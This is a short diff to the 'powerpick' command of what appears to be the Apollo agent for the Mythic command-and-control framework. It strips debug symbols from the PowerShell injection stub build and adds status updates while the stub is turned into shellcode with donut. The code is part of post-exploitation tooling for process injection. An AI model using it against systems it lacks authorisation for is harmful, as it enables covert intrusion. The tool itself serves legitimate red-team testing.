@@ -3,7 +3,6 @@ import shutil
 import tempfile
 from mythic_container.MythicCommandBase import *
 import json
-from apollo.mythic.sRDI import ShellcodeRDI
 from uuid import uuid4
 from mythic_container.MythicRPC import *
 from os import path
@@ -56,7 +55,7 @@ class PowerpickCommand(CommandBase):
         outputPath = "{}/PowerShellHost/bin/Release/PowerShellHost.exe".format(agent_build_path.name)
         # shutil to copy payload files over
         copy_tree(str(self.agent_code_path), agent_build_path.name)
-        shell_cmd = "dotnet build -c release -p:Platform=x64 {}/PowerShellHost/PowerShellHost.csproj -o {}/PowerShellHost/bin/Release/".format(agent_build_path.name, agent_build_path.name)
+        shell_cmd = "dotnet build -c release -p:DebugType=None -p:DebugSymbols=false -p:Platform=x64 {}/PowerShellHost/PowerShellHost.csproj -o {}/PowerShellHost/bin/Release/".format(agent_build_path.name, agent_build_path.name)
         proc = await asyncio.create_subprocess_shell(shell_cmd, stdout=asyncio.subprocess.PIPE,
                                                      stderr=asyncio.subprocess.PIPE, cwd=agent_build_path.name)
         stdout, stderr = await proc.communicate()
@@ -71,8 +70,15 @@ class PowerpickCommand(CommandBase):
         )
         global POWERSHELL_HOST_PATH
         if not path.exists(POWERSHELL_HOST_PATH):
+            await SendMythicRPCTaskUpdate(MythicRPCTaskUpdateMessage(
+                TaskID=taskData.Task.ID,
+                UpdateStatus=f"building injection stub"
+            ))
             await self.build_powershell()
-
+        await SendMythicRPCTaskUpdate(MythicRPCTaskUpdateMessage(
+            TaskID=taskData.Task.ID,
+            UpdateStatus=f"generating stub shellcode"
+        ))
         donutPic = donut.create(file=POWERSHELL_HOST_PATH, params=taskData.args.get_arg("pipe_name"))
         file_resp = await SendMythicRPCFileCreate(MythicRPCFileCreateMessage(
             TaskID=taskData.Task.ID,
